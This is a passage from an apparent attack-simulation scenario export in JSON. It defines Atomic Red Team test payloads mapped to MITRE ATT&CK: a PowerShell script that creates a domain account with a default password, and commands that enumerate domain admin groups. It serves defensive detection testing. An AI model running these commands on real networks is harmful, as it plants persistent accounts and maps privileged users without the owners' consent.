obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"},{\"key\":\"username\",\"label\":\"username\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"T1136.002_Admin\",\"type\":\"text\"},{\"key\":\"password\",\"label\":\"password\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"T1136_pass123!\",\"type\":\"text\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"b19122b2-38fe-4982-8701-4902e100fd99\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "56cf4411-18ac-48ca-960a-27aa81634ca2",
        "payload_type" : "Command",
        "payload_name" : "Create a new Domain Account using PowerShell",
        "payload_description" : "Creates a new Domain User using the credentials of the Current User\n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "c0f6ae0d-3873-4de1-827c-b1b95234b32e",
          "attack_pattern_name" : "Domain Account",
          "attack_pattern_description" : "Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.(Citation: Savill 1999)\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
          "attack_pattern_external_id" : "T1136.002",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "8bbdf37e-90c1-4e8a-98e9-a0fd61c92930",
            "phase_external_id" : "TA0003",
            "phase_stix_id" : "x-mitre-tactic--5bc1d813-693e-4823-9961-abf9af4b0e92",
            "phase_name" : "Persistence",
            "phase_shortname" : "persistence",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
            "phase_order" : 4
          } ]
        } ],
        "payload_cleanup_executor" : "psh",
        "payload_cleanup_command" : "cmd /c \"net user #{username} /del >nul 2>&1\"\n",
        "payload_elevation_required" : false,
        "payload_arguments" : [ {
          "type" : "text",
          "key" : "username",
          "default_value" : "T1136.002_Admin",
          "description" : null,
          "separator" : null
        }, {
          "type" : "text",
          "key" : "password",
          "default_value" : "T1136_pass123!",
          "description" : null,
          "separator" : null
        } ],
        "payload_prerequisites" : [ ],
        "payload_external_id" : "5a3497a4-1568-4663-b12a-d4a5ed70c7d7",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:12:14.570595Z",
        "payload_updated_at" : "2025-07-03T14:48:13.387793Z",
        "command_executor" : "psh",
        "command_content" : "$SamAccountName = '#{username}'\n$AccountPassword = ConvertTo-SecureString '#{password}' -AsPlainText -Force\nAdd-Type -AssemblyName System.DirectoryServices.AccountManagement\n$Context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)\n$User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context)\n$User.SamAccountName = $SamAccountName\n$TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)\n$User.SetPassword($TempCred.GetNetworkCredential().Password)\n$User.Enabled = $True\n$User.PasswordNotRequired = $False\n$User.DisplayName = $SamAccountName\n$User.Save()\n$User\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:12:14.584129Z",
      "injector_contract_updated_at" : "2024-12-12T08:12:14.584130Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "c0f6ae0d-3873-4de1-827c-b1b95234b32e",
        "attack_pattern_name" : "Domain Account",
        "attack_pattern_description" : "Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.(Citation: Savill 1999)\n\nSuch accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",
        "attack_pattern_external_id" : "T1136.002",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "8bbdf37e-90c1-4e8a-98e9-a0fd61c92930",
          "phase_external_id" : "TA0003",
          "phase_stix_id" : "x-mitre-tactic--5bc1d813-693e-4823-9961-abf9af4b0e92",
          "phase_name" : "Persistence",
          "phase_shortname" : "persistence",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
          "phase_order" : 4
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "224c6711-0e34-4fb0-8d32-6ec57ee79dac",
    "inject_title" : "Basic Permission Groups Discovery Windows (Domain)",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ]
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ {
      "dependency_relationship" : {
        "inject_parent_id" : "b9e4df77-c689-4e72-a41e-6993379cbb36",
        "inject_children_id" : "224c6711-0e34-4fb0-8d32-6ec57ee79dac"
      },
      "dependency_condition" : {
        "mode" : "and",
        "conditions" : [ {
          "key" : "Execution",
          "value" : true,
          "operator" : "eq"
        } ]
      },
      "dependency_created_at" : "2025-07-04T15:49:26.405990Z",
      "dependency_updated_at" : "2025-07-04T15:49:26.406002Z"
    } ],
    "inject_depends_duration" : 120,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Basic Permission Groups Discovery Windows (Domain)",
          "fr" : "Basic Permission Groups Discovery Windows (Domain)"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "fefa17a1-5ac7-4c73-b515-8ab531af4046",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "fefa17a1-5ac7-4c73-b515-8ab531af4046",
      "injector_contract_labels" : {
        "en" : "Basic Permission Groups Discovery Windows (Domain)",
        "fr" : "Basic Permission Groups Discovery Windows (Domain)"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Basic Permission Groups Discovery Windows (Domain)\",\"fr\":\"Basic Permission Groups Discovery Windows (Domain)\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"fefa17a1-5ac7-4c73-b515-8ab531af4046\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "01cb2cdc-3714-4a24-9c58-b18aa2f80453",
        "payload_type" : "Command",
        "payload_name" : "Basic Permission Groups Discovery Windows (Domain)",
        "payload_description" : "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "11201cbd-c89d-4592-9dd6-61e2655637f3",
          "attack_pattern_name" : "Domain Groups",
          "attack_pattern_description" : "Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n\nCommands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.",
          "attack_pattern_external_id" : "T1069.002",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "e0a815b3-1d61-4145-915a-d17482f5887d",
            "phase_external_id" : "TA0007",
            "phase_stix_id" : "x-mitre-tactic--c17c5845-175e-4421-9713-829d0573dbc9",
            "phase_name" : "Discovery",
            "phase_shortname" : "discovery",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "phase_order" : 8
          } ]
        } ],
        "payload_cleanup_executor" : null,
        "payload_cleanup_command" : null,
        "payload_elevation_required" : false,
        "payload_arguments" : [ ],
        "payload_prerequisites" : [ ],
        "payload_external_id" : "dd66d77d-8998-48c0-8024-df263dc2ce5d",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:12:39.982854Z",
        "payload_updated_at" : "2025-07-03T14:50:16.419783Z",
        "command_executor" : "cmd",
        "command_content" : "net localgroup\nnet group /domain\nnet group \"enterprise admins\" /domain\nnet group \"domain admins\" /domain\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:12:39.995317Z",
      "injector_contract_updated_at" : "2024-12-12T08:12:39.995317Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "11201cbd-c89d-4592-9dd6-61e2655637f3",
        "attack_pattern_name" : "Domain Groups",
        "attack_pattern_description" : "Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n\nCommands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.",
        "attack_pattern_external_id" : "T1069.002",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "e0a815b3-1d61-4145-915a-d17482f5887d",
          "phase_external_id" : "TA0007",
          "phase_stix_id" : "x-mitre-tactic--c17c5845-175e-4421-9713-829d0573dbc9",
          "phase_name" : "Discovery",
          "phase_shortname" : "discovery",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
          "phase_order" : 8
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "81eb5425-8f26-4f09-8006-27a15ae867bb",
    "inject_title" : "System Network Configuration Discovery on Windows",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ]
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 420,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "System Network Configuration Discovery on Windows",
          "fr" : "System Network Configuration Discovery on Windows"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "7cc5ec12-1e94-4d84-a8bc-0ac1caae8c6f",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "7cc5ec12-1e94-4d84-a8bc-0ac1caae8c6f",
      "injector_contract_labels" : {
